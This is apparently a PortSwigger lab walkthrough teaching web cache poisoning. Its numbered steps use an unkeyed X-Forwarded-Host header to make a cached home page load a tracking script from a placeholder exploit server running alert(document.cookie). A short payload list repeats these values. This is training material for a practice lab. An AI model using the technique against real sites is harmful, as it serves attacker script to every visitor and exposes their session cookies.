## Web cache poisoning with an unkeyed header

**Category:** cache_poisoning
**Difficulty:** Medium

### Description
This lab is vulnerable to web cache poisoning because it handles input from an unkeyed header in an unsafe way. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser.

### Solution Steps
1. Analyze the homepage and identify cacheable responses
2. Test for unkeyed headers - the X-Forwarded-Host header is often unkeyed
3. Send request with: `X-Forwarded-Host: test.com`
4. Check if test.com appears in the response (e.g., in script src URLs)
5. The response includes a tracking script: /resources/js/tracking.js
6. The X-Forwarded-Host value controls where the script is loaded from
7. Set up an exploit server with malicious JavaScript containing alert(document.cookie)
8. Poison the cache:
9. Add cache buster first to test: `GET /?cb=1234` with `X-Forwarded-Host: YOUR-EXPLOIT-SERVER`
10. Once confirmed, poison the main page (no cache buster)
11. Send repeatedly until X-Cache: hit confirms caching
12. Victim visits homepage, loads tracking.js from your server
13. Your malicious JS executes alert(document.cookie)

### Key Payloads
- `alert(document.cookie)`
- `X-Forwarded-Host`
- `X-Forwarded-Host: YOUR-EXPLOIT-SERVER`
- `/resources/js/tracking.js`
- `?cb=1234` (cache buster)
- `X-Cache: hit`

### Indicators of Success
- X-Forwarded-Host value reflected in response
- Script src changes to attacker-controlled domain
- Response cached with poisoned content
- Victim browser loads script from exploit server
- alert(document.cookie) executes

---
*Source: PortSwigger Web Security Academy*
